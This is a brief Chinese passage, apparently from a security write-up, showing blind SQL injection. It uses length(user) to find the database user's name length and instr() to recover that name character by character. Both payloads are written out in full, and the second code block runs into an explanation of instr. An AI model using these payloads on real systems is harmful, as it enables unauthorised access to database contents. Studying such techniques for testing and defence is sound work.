直接注下user的长度  
```
'OR+1+in+length(user)+and+'a'+in+'a
```  
  
只有相等时会卡死，很明显为7位  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/Pled5HYvsFFgTMHKpBqRBSxfTFGpribfYAYjXK3B4cGSoaqBUHg6z3734eHVicuf640G98zmicICRVNGBiaZql3my9Lg3iaB9lL3wH0jRNLAJuGU/640?wx_fmt=png&from=appmsg "")  
  
直接用instr函数注用户名  
```
'OR+1+in+instr(user,'u')+and+'a'+in+'ainstr函数代表后面那个字符在前面字符串第一次出现的位置例如:instr('user','u')返回1instr('user','us')返回1instr('user','s')返回2
```
